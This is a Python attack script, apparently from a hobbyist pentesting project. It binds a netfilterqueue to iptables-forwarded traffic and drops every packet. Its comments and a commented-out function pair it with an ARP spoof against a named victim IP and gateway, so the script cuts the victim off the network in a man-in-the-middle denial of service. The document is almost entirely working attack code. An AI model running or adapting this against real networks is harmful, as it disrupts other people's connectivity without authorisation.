from netfilterqueue import NetfilterQueue
import subprocess

# to run this module you have to enable
# 1. iptables -I FORWARD -j NFQUEUE --queue-num 0
# 2. Run an ARP Spoof Against that Victim
# 3. run This Program


def intercept_packets(packet):
    packet.drop()


def bindQueueAndIntercept(queue):
    print("[+] Binding Packet Queue " + str(0))
    # 0 -> is the queue number which we gave in cmd line to forward store in Q
    queue.bind(0, intercept_packets)
    queue.run()


def open_packet_forwarding():
    try:
        subprocess.call(
            "iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
        print("[+] Packet Forwarding initialized")
    except:
        print("[-] Error Preparing Packet Forwarding")


# def begin_process():
#     ip_address = "192.168.29.163"
#     gate_way_address = "192.168.29.1"
#     queue = NetfilterQueue()
#     try:
#         open_packet_forwarding()
#         th = threading.Thread(target=perform_arp_attack,
#                               args=(ip_address, gate_way_address))
#         th.start()
#         bindQueueAndIntercept(queue)
#     except:
#         print("\n[-] triggered an exit.. restoring access to " +
#               ip_address + " Please wait ....")
#         print("[-] Resetting ip tables")
#         subprocess.call("iptables --flush", shell=True)
#         queue.unbind()
#         print("[-] Done!!")


def begin_process():
    ip_address = "192.168.29.163"
    queue = NetfilterQueue()
    try:
        # open_packet_forwarding()
        bindQueueAndIntercept(queue)
    except:
        print("\n[-] triggered an exit.. restoring access to " +
              ip_address + " Please wait ....")
        # print("[-] Resetting ip tables")
        # subprocess.call("iptables --flush", shell=True)
        queue.unbind()
        print("[-] Done!!")


begin_process()
